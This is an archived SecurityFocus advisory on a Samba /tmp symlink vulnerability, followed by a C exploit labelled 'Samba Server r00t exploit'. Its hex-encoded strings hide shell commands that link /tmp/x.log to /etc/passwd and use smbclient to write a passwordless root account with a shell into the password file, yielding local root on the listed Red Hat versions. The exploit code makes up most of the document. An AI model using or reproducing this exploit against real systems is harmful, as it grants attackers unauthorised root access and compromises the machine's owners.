source: http://www.securityfocus.com/bid/2617/info

Samba is a flexible file sharing packaged maintained by the Samba development group. It provides interoperatability between UNIX and Microsoft Windows systems, permitting the sharing of files and printing services.

A problem in the package could make it possible to deny service to legitimate users. Due to the insecure creation of files in the /tmp file system, it is possible for a user to create a symbolic link to other files owned by privileged users in the system, such as system device files, and write data to the files.

This vulnerability makes it possible for a local user to deny service to other users of the system, and potentially gain elevated privileges. 

/*
 * Samba Server r00t exploit
 *
 * Scope: Local (this exploit) and posible remote if conditions are given.
 * Vuln:
 *      RedHat 5.1
 *      RedHat 5.2
 *      RedHat 6.0
 *      RedHat 6.1
 *      RedHat 6.2
 *      RedHat 7.0
 *      RedHat 7.1
 *      I don't know if other versions are vulnerable too.
 *
 * Run this exploit and then take a look at your passwd file.
 * Run: ./samba-exp user
 *
 * Author:      Gabriel Maggiotti
 * Email:       gmaggiot@ciudad.com.ar
 * Webpage:     http://qb0x.net
 */


#include <stdio.h>
#include <string.h>

int main(int argc,char *argv[])
{
char inject1[]=
        "\x2f\x62\x69\x6e\x2f\x72\x6d\x20\x2d\x72\x66\x20\x2f"
        "\x74\x6d\x70\x2f\x78\x2e\x6c\x6f\x67";
char inject2[]=
        "\x2f\x62\x69\x6e\x2f\x6c\x6e\x20\x2d\x73\x20\x2f\x65"
        "\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x20\x2f\x74\x6d"
        "\x70\x2f\x78\x2e\x6c\x6f\x67";
char inject3a[100]=
        "\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x73\x6d\x62\x63"
        "\x6c\x69\x65\x6e\x74\x20\x2f\x2f\x6c\x6f\x63\x61\x6c"
        "\x68\x6f\x73\x74\x2f\x22\xa\xa";
char inject3b[]=
        "\x3a\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e"
        "\x2f\x73\x68\x5c\x6e\x22\x20\x2d\x6e\x20\x2e\x2e\x2f"
        "\x2e\x2e\x2f\x2e\x2e\x2f\x74\x6d\x70\x2f\x78\x20\x2d"
        "\x4e\xa";

if(argc!=2){
        fprintf(stderr,"usage: %s <user>\n",*argv);
        return 1;
        }
strcat(inject3a,argv[1]);
strcat(inject3a,inject3b);
system(inject1, 0);
system(inject2, 0);
system(inject3a, 0);

return 0;
}

